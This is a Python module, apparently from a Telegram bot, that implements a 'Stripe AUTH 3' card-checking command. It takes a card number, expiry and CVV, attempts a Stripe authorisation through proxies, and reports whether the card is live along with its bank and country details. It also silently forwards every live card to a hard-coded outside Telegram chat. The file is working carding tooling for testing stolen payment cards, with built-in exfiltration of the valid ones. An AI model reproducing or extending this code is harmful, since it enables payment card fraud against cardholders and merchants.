import httpx
from pyrogram import Client, filters
import time
import asyncio
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *
target_chat_id = -1002140459626
@Client.on_message(filters.command("au3", [".", "/"]))
async def stripe_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            resp = """<b>
Gate Name: Stripe AUTH 3 💋️
CMD: /au3

Message: No CC Found in your input ❌

Usage: /au3 cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        firstresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■□□□
⊗ GATEWAY- Stripe AUTH 3
</b>
"""

        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■■□
⊗ GATEWAY- Stripe AUTH 3
</b>
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(
            message.chat.id, firstchk.id, secondresp
        )

        start = time.perf_counter()
        proxies = await get_proxy_format()
        session = httpx.AsyncClient(
            timeout=60,
            proxies=proxies,
            follow_redirects=True
        )
        result = await create_cvv_charge(fullcc, session)
        getbin = await get_bin_details(cc, session)
        getresp = await get_charge_resp(result, user_id, fullcc)
        status, response = getresp["status"], getresp["response"]
        await session.aclose()

        end = time.perf_counter()

        thirdresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■■■
⊗ GATEWAY- Stripe AUTH 3
</b>
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(
            message.chat.id, secondchk.id, thirdresp
        )
        brand, type, level, bank, country, flag, currency = (
            getbin[0],
            getbin[1],
            getbin[2],
            getbin[3],
            getbin[4],
            getbin[5],
            getbin[6],
        )

        finalresp = f"""
<b>↯ AUTH 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - {status}
⊗ Response - {response}
⊗ GATEWAY- Stripe AUTH 3
－－－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {cc[:6]} - {brand} - {type} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {flag} - {currency}
－－－－－－－－－－－－－－－－


Time in Progress - {end - start:0.4f}sec
Credit Deducted - 1
Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 💋️ [ {role} ]
Bot by - <a href="tg://user?id=5371579102">stripe_xD</a>

"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Live 🟢" or status == "Live 🟡":
    # Send the final response to the specified chat ID
         await Client.send_message(target_chat_id, text=finalresp)

    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())

